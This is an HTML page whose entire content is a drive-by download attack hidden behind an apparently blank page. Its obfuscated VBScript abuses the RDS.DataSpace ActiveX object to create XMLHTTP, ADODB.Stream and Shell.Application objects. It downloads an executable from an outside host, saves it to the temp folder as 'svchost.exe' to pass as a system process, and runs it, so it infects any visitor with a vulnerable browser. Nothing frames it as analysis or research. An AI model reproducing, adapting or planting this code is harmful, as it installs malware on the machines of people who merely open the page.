<html>
<body>
<script type="text/jscript">
function init () {
document.write("<center><font color=red></font><center>");}
window.onload = init;
</script>
<script language="VBScript">
on error resume next

    tcsafe = "http://www.fyun118.com/1.exe"
z1="o"
z2="b"
z3="j"
z4="e"
z5="c"
z6="t"
m1=z1&z2&z3&z4&z5&z6
m2="classid"
m3="clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
m4="Microsoft.XMLHTTP"
m5="Shell.Application"
m6="Scripting.FileSystemObject"
sub tcsafe1exe(m5,X9)
set Xe = Xc.createobject(m5,"")
dd="open"
Xe.ShellExecute X9,BBS,BBS,dd,0
end sub
Set Xc = document.createElement(m1)
Xc.setAttribute m2, m3
Xi=m4
Set Xd = Xc.CreateObject(Xi,"")
a1="Adodb.stream"
a5=a1&a2&a3&a4
Xg=a5
set Xa = Xc.createobject(Xg,"")
Xa.type = 1
Xh="GET"
Xd.Open Xh, tcsafe, False
Xd.Send
X9="svchost.exe"
set Xb = Xc.createobject(m6,"")
set Xe = Xb.GetSpecialFolder(2)
sub tcsafe2exe(Xe,X9)
X9= Xb.BuildPath(Xe,X9)
end sub
Xa.open
X8="Xa.BuildPath(Xa,X8)"
X7="Xb.BuildPath(Xb,X7)"
X6="Xc.BuildPath(Xd,X6)"
X5="Xd.BuildPath(Xf,X5)"
X4="Xe.BuildPath(Xg,X4)"
X3="Xf.BuildPath(Xh,X4)"
X2="Xg.BuildPath(Xi,X3)"
X1="Xh.BuildPath(Xg,X1)"
X0="Xi.BuildPath(Xk,X0)"
call tcsafe2exe(Xe,X9)
Xa.write Xd.responseBody
Xa.savetofile X9,2
Xa.close
call tcsafe1exe(m5,X9)
</script>
</html>

